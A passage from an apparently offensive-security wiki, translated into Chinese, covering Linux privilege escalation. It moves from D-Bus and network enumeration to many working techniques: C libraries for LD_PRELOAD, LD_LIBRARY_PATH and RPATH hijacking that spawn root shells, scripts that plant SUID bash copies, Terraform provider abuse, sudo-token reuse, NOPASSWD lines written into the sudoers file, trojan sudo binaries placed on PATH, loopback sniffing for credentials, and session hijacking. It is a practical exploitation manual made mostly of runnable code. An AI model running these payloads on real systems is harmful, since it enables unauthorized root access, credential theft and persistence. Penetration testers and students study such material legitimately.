D-Bus 是一个复杂的进程间通信 (IPC) 系统，使应用程序能够高效地交互和共享数据。针对现代 Linux 系统设计，它提供了一个稳健的框架以支持多种形式的应用间通信。

该系统功能多样，支持基本的 IPC，增强进程间的数据交换，类似于增强版的 UNIX domain sockets。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的来电信号可以促使音乐播放器静音，从而提升用户体验。此外，D-Bus 支持远程对象系统，简化应用间的服务请求和方法调用，使传统上复杂的流程变得更简单。

D-Bus 基于**允许/拒绝 模型**运行，根据匹配策略规则的累积结果来管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互，可能通过利用这些权限导致提权。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了这样一个策略示例，详细说明了 root 用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略适用于所有人，而 "default" 上下文策略适用于所有未被其他特定策略覆盖的情况。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此学习如何 enumerate 和 exploit D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

通常对网络进行 enumerate 并弄清主机的位置总是很有趣。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering 快速排查

如果主机可以运行命令但 callbacks 失败，快速区分 DNS、transport、proxy 和 route filtering：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 开放端口

始终检查在访问该机器之前，你无法与之交互但正在该机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
按绑定目标对监听器进行分类：

- `0.0.0.0` / `[::]`: 在所有本地接口上暴露。
- `127.0.0.1` / `::1`: 仅限本地（适合用于隧道/转发的候选）。
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 通常仅能从内部网络段访问。

### 本地专用服务排查工作流

当你攻陷一台主机后，绑定到 `127.0.0.1` 的服务常常会在你的 shell 中首次变得可访问。一个快速的本地工作流程是：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS 作为网络扫描器（仅网络模式）

除了本地 PE 检查外，linPEAS 可以作为一个专注的网络扫描器运行。它使用 `$PATH` 中可用的二进制文件（通常是 `fping`、`ping`、`nc`、`ncat`），并且不安装任何工具。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).

### Sniffing

检查是否可以 sniff 流量。如果可以，你可能能够获取一些凭证。
```
timeout 1 tcpdump
```
快速实用检查：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
回环接口 (`lo`) 在 post-exploitation 中尤其有价值，因为许多仅面向内部的服务会在其上暴露 tokens/cookies/credentials：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
先捕获，稍后解析：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

检查 **who** 你是，你拥有哪些 **privileges**，系统中有哪些 **users**，哪些可以 **login**，以及哪些拥有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受一个漏洞影响，允许具有 **UID > INT_MAX** 的用户提升权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用** 命令： **`systemd-run -t /bin/bash`**

### Groups

检查你是否是可能授予你 root 权限的某个 **组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你 **知道环境中的任何密码**，**尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音并且计算机上存在 `su` 和 `timeout` 二进制文件，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 PATH 滥用

### $PATH

如果你发现你可以 **在 $PATH 的某个文件夹内写入**，你可能能够通过 **在可写文件夹中创建一个 backdoor**（其名称与将由另一个用户执行的某个命令相同，理想情况下是 root）来提升权限，前提是该命令 **不会从位于你可写文件夹之前的文件夹中加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用下面的命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些**出乎意料的命令允许你读取和/或写入文件甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在可以很容易地通过将 ssh 密钥添加到 root 目录或调用 `sh` 来获得一个 shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某个程序或命令时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例，**基于 HTB machine Admirer**，**存在漏洞**：可通过 **PYTHONPATH hijacking** 在以 root 身份执行脚本时加载任意 python library：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

如果 sudoers 保留 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shell，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件将以 root 权限被 source。

- Requirements:
- 一个你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
- 避免为被允许通过 sudo 执行的命令使用 shell wrappers；使用精简的二进制。
- 当保留的环境变量被使用时，考虑对 sudo 的 I/O 进行记录和告警。

### Terraform 通过 sudo 保留 HOME (!env_reset)

如果 sudo 在允许 `terraform apply` 的同时保留环境（`!env_reset`），那么 `$HOME` 将保持为调用用户。Terraform 因此会以 root 身份加载 **$HOME/.terraformrc** 并遵从 `provider_installation.dev_overrides`。

- 将所需的 provider 指向一个可写目录，并放置一个以该 provider 命名的恶意插件（例如 `terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 会在 Go plugin handshake 失败，但在终止前以 root 身份执行 payload，留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 校验绕过

Terraform 的变量可以通过 `TF_VAR_<name>` 环境变量提供，当 sudo 保留环境时这些变量会被保留。像 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱校验可以通过 symlinks 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform 解析符号链接并将真实的 `/root/root.txt` 复制到可被攻击者读取的目标。相同的方法也可以用于通过预先创建目标符号链接（例如，将 provider 的目标路径指向 `/etc/cron.d/`）**写入**有特权的路径。

### requiretty / !requiretty

在一些较旧的发行版上，sudo 可以通过 `requiretty` 进行配置，该选项强制 sudo 仅在交互式 TTY 下运行。如果 `!requiretty` 被设置（或该选项不存在），sudo 可以在诸如 reverse shells、cron jobs 或 scripts 等非交互式环境中执行。
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH` 或 `secure_path` 包含攻击者可写的条目（例如 `/home/<user>/bin`），则 sudo 允许的目标中任何相对命令都可以被覆盖。

- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**跳转** 以读取其他文件，或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 命令/SUID 二进制文件未指定命令路径

如果**sudo 权限**被授予给单个命令**且未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果一个 **suid** 二进制文件 **在执行另一个命令时未指定其路径（始终使用** _**strings**_ **检查可疑 SUID 二进制文件的内容）**，则也可以使用该技术。

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制（指定命令路径）

如果 **suid** 二进制 **执行另一个命令并指定了路径**，那么你可以尝试 **export a function**，其名称与 suid 文件所调用的命令相同。

例如，如果一个 suid 二进制文件调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid binary 时，该函数将被执行

### 可写脚本由 SUID 包装器执行

一种常见的 custom-app 错误配置是一个由 root 拥有的 SUID 二进制包装器会执行一个脚本，而该脚本本身对 low-priv users 可写。

典型模式:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
快速检查:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令 **编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为他可以控制库被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

遇到具有 **SUID** 权限且看起来不寻常的二进制文件，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到像 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明可能存在可利用的机会。

要利用这个漏洞，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过修改文件权限并执行具有提升权限的 shell 来获取提权。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致 system compromise。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到一个 SUID binary 会从我们可写的 folder 加载 library，我们现在就在该 folder 中创建所需名称的 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似如下的错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理好的 Unix 二进制文件列表，攻击者可以利用这些二进制绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 在只能**注入参数**的情况下提供类似的内容。

该项目收集了 Unix 二进制的合法功能，这些功能可能被滥用以突破受限 shell、提权或维持提升的权限、传输文件、生成 bind 和 reverse shells，并辅助其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

在你拥有 **sudo access** 但不知道密码的情况下，你可以通过 **等待 sudo 命令执行然后劫持会话令牌** 来提权。

提权要求：

- 你已经有一个 shell，用户为 "_sampleuser_"
- "_sampleuser_" 已经**使用 `sudo`** 在**过去 15mins**内执行过某些操作（默认这是 sudo token 允许我们在不输入密码的情况下使用 `sudo` 的时长）
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 **exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 该 **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 该 **第三个 exploit** (`exploit_v3.sh`) 将 **创建 sudoers 文件**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或该文件夹中创建的任何文件具有 **write permissions**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **create a sudo token for a user and PID**。\
例如，如果你能够覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且你以该用户身份拥有 PID 为 1234 的 shell，那么你可以在不需要知道密码的情况下通过以下方式 **obtain sudo privileges**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 目录下的文件配置谁可以使用 `sudo` 以及如何使用。\
这些文件 **默认只有用户 root 和组 root 可以读取**。\
**如果** 你可以 **读取** 该文件，你可能能够 **获得一些有用的信息**，而如果你可以 **写入** 任何这些文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写入权限，你就可以滥用该权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的工具，例如 OpenBSD 的 `doas`，请记得检查其配置文件：`/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道 **用户通常连接到机器并使用 `sudo`** 来提权，并且你在该用户上下文获得了一个 shell，你可以 **创建一个新的 sudo 可执行文件**，该文件会先以 root 身份执行你的代码，然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会运行你的 sudo 可执行文件。

注意如果该用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似下面的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自哪里**。通常，该文件包含如下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。 这些配置文件 **指向其他文件夹**，系统将在这些文件夹中**搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 内搜索库**。

如果由于某种原因 **用户对下列任一路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件，或 `/etc/ld.so.conf.d/*.conf` 指向的配置文件内的任意文件夹，则该用户可能能够提升权限。\
查看以下页面，了解 **如何利用此错误配置**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将会被程序在此处使用（如 `RPATH` 变量所指定）。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 向进程提供一个 **可用 root 特权的子集**。这实际上将 root **特权拆分为更小、更独立的单元**。这些单元可被独立地授予给进程。这样可以减少完整特权集，从而降低被利用的风险。\
阅读以下页面以 **了解有关 capabilities 及如何滥用它们的更多信息**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**表示 "execute" 的位**意味着受影响的用户可以 **"cd"** 进入该文件夹。\
**"read"** 位意味着用户可以 **列出** **文件**，而 **"write"** 位意味着用户可以 **删除** 和 **创建** 新的 **文件**。

## ACLs

Access Control Lists (ACLs) 代表可自由裁量权限的第二层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对非所有者或组成员的特定用户的访问权来增强对文件或目录的控制。此级别的 **细粒度确保更精确的访问管理**。更多详情可以在 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) 找到。

**给** 用户 "kali" 授予文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins 上的隐藏 ACL backdoor

一种常见的错误配置是位于 `/etc/sudoers.d/` 的属主为 root、权限为 `440` 的文件，仍然通过 ACL 授予低权限用户写入权限。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
如果你看到像 `user:alice:rw-` 这样的情况，即使模式位受限，该用户仍然可以追加 sudo 规则：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
这是一个高影响的 ACL persistence/privesc 路径，因为在仅使用 `ls -l` 审查时很容易被遗漏。

## 打开 shell sessions

在 **旧版本** 中，你可能可以 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你将只能 **connect** 到属于 **你自己的用户** 的 screen sessions。 但是，你可能会在会话内发现 **会话内的有用信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是一个 **old tmux versions** 的问题。我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) 会话。

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
